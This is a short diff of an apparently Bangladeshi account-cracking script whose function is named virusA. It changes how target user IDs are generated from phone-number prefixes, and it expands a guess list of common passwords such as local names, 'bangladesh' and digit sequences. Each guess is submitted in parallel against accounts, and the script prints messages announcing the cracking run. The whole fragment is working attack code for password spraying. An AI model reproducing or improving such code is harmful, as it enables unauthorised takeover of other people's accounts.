@@ -240,8 +240,8 @@ def virusA():
 		print('\033[1;97m┗━[•] \033[1;92mSTART BD NUMBER MIXT CRACKING... ')
 		print(50*'━')
 		for guru in user:
-			uid = code+fuck
-			pwx = [fuck,'FREE FIRE','free fire','i love you','bangladesh','Bangladesh','112255','aaabbb','00009999','09876543','909090','55443322','222111','223344','alamin','nazmul','lamiya','sumaiya','sadiya','mimmim']
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','bangladesh','Bangladesh','112255','aaabbb','00009999','09876543','909090','55443322','222111','223344','alamin','nazmul','lamiya','sumaiya','sadiya','mimmim']
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
